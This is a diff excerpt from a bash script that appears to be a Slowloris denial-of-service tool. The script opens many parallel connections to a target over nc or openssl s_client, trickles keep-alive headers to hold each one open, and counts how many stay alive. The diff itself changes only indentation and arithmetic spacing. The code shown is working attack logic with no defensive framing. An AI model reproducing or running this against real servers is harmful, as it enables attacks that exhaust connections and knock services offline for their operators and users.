@@ -58,11 +58,11 @@ for i in $(seq 1 $NUM_CONNECTIONS); do
         echo "X-Slowloris-${j}: keep-alive-$(date +%s)"
       done
     } | if [[ "$USE_SSL" == "true" ]]; then
-          timeout "$MAX_DURATION" openssl s_client -connect "${TARGET_IP}:${PORT}" \
-            -servername "$TARGET" -quiet 2>/dev/null || true
-        else
-          timeout "$MAX_DURATION" nc -q 0 "${TARGET_IP}" "${PORT}" 2>/dev/null || true
-        fi
+      timeout "$MAX_DURATION" openssl s_client -connect "${TARGET_IP}:${PORT}" \
+        -servername "$TARGET" -quiet 2>/dev/null || true
+    else
+      timeout "$MAX_DURATION" nc -q 0 "${TARGET_IP}" "${PORT}" 2>/dev/null || true
+    fi
 
     echo "    Connection ${i} closed"
   ) &
@@ -78,12 +78,12 @@ TIMER=0
 while [[ $TIMER -lt $MAX_DURATION ]]; do
   ALIVE=0
   for pid in "${PIDS[@]}"; do
-    kill -0 "$pid" 2>/dev/null && ALIVE=$((ALIVE+1))
+    kill -0 "$pid" 2>/dev/null && ALIVE=$((ALIVE + 1))
   done
   [[ $ALIVE -eq 0 ]] && break
   echo "    Active connections: ${ALIVE} (${TIMER}s elapsed)"
   sleep 10
-  TIMER=$((TIMER+10))
+  TIMER=$((TIMER + 10))
 done
 
 echo ""
